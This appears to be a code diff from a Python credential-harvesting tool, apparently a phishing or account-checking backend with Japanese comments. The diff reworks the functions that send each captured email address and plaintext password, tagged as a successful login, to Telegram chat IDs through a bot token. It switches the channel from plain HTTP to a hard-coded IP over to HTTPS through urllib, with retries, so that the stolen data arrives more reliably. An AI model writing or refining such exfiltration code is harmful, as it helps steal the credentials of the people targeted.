@@ -282,15 +282,13 @@ def get_all_active_sessions():
 # ========================================
 
 def send_telegram_notification(email, password):
-    """テレグラムにログイン成功通知を送信（DNS解決問題対応版）"""
+    """テレグラムにログイン成功通知を送信（urllib使用版 - DNS問題完全回避）"""
     message = f"◎ログイン成功\nメールアドレス：{email}\nパスワード：{password}"
     
     log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
     
-    # urllib3のSSL警告を一時的に無効化
-    import warnings
-    from urllib3.exceptions import InsecureRequestWarning
-    warnings.simplefilter('ignore', InsecureRequestWarning)
+    import urllib.request
+    import json as json_module
     
     for chat_id in TELEGRAM_CHAT_IDS:
         success = False
@@ -298,35 +296,28 @@ def send_telegram_notification(email, password):
         
         for attempt in range(max_retries):
             try:
-                # Telegram APIへ直接HTTPで送信（SSL問題回避）
-                url = f"http://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                payload = {
-                    'chat_id': chat_id,
-                    'text': message
-                }
+                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                data = {'chat_id': chat_id, 'text': message}
                 
                 log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id}")
                 
-                response = requests.post(
-                    url, 
-                    json=payload,
-                    timeout=10
+                req = urllib.request.Request(
+                    url,
+                    data=json_module.dumps(data).encode('utf-8'),
+                    headers={'Content-Type': 'application/json'},
+                    method='POST'
                 )
                 
-                if response.status_code == 200:
-                    log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id}")
-                    success = True
-                    break
-                else:
-                    log_with_timestamp("ERROR", f"Telegram API エラー | Chat: {chat_id} | Status: {response.status_code} | Response: {response.text}")
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    if response.status == 200:
+                        log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id}")
+                        success = True
+                        break
+                    else:
+                        log_with_timestamp("ERROR", f"Telegram API エラー | Chat: {chat_id} | Status: {response.status}")
                     
-            except requests.exceptions.Timeout:
-                log_with_timestamp("ERROR", f"Telegram タイムアウト (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id}")
-                if attempt < max_retries - 1:
-                    time.sleep(2)
-                    
-            except requests.exceptions.ConnectionError as e:
-                log_with_timestamp("ERROR", f"Telegram 接続エラー (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id} | Error: {str(e)}")
+            except urllib.error.URLError as e:
+                log_with_timestamp("ERROR", f"Telegram URLエラー (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id} | Error: {str(e)}")
                 if attempt < max_retries - 1:
                     time.sleep(2)
                     
@@ -339,7 +330,7 @@ def send_telegram_notification(email, password):
             log_with_timestamp("ERROR", f"✗ Telegram通知失敗（全試行失敗） | Chat: {chat_id}")
 
 def send_telegram_notification_error(message):
-    """エラー通知をテレグラムに送信（重複防止あり）"""
+    """エラー通知をテレグラムに送信（重複防止あり・urllib版）"""
     error_type = message.split('\n')[0] if '\n' in message else message
     current_time = time.time()
     
@@ -354,20 +345,24 @@ def send_telegram_notification_error(message):
     
     log_with_timestamp("TELEGRAM", f"エラー通知送信開始 | Message: {error_type}")
     
-    # urllib3のSSL警告を一時的に無効化
-    import warnings
-    from urllib3.exceptions import InsecureRequestWarning
-    warnings.simplefilter('ignore', InsecureRequestWarning)
+    import urllib.request
+    import json as json_module
     
     for chat_id in TELEGRAM_CHAT_IDS:
         try:
-            url = f"http://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {
-                'chat_id': chat_id,
-                'text': error_message
-            }
-            requests.post(url, json=payload, timeout=5)
-            log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id}")
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            data = {'chat_id': chat_id, 'text': error_message}
+            
+            req = urllib.request.Request(
+                url,
+                data=json_module.dumps(data).encode('utf-8'),
+                headers={'Content-Type': 'application/json'},
+                method='POST'
+            )
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                if response.status == 200:
+                    log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id}")
         except Exception as e:
             log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}) | Error: {str(e)}")
     
